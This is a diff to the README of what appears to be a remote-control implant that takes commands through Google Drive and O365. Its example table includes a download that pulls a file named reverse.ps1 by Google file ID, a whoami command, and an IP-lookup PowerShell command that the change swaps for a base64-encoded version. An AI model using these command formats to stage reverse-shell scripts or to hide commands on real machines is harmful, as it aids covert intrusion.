@@ -53,7 +53,7 @@ Each time the app is launched it will create a 8 character hex UUID to let the e
 |Google download (uses file ID) | download;1I80EO2PYK_-ahp7q_hsVQyjKmy23J67L;reverse.ps1|File Downloaded|
 |O365 download (uses file name) | download;script.txt|File Downloaded|
 | Cmd example         | whoami   | tim|
-| Powershell encoded command Example | (Invoke-WebRequest -URI https://icanhazip.com/).Content | 52.123.5.2 |
+| Powershell encoded command Example | KABJAG4AdgBvAGsAZQAtAFcAZQBiAFIAZQBxAHUAZQBzAHQAIAAtAFUAUgBJACAAaAB0AHQAcABzADoALwAvAGkAYwBhAG4AaABhAHoAaQBwAC4AYwBvAG0ALwApAC4AQwBvAG4AdABlAG4AdAA= | 52.123.5.2 |
 
 ### Defaults
 
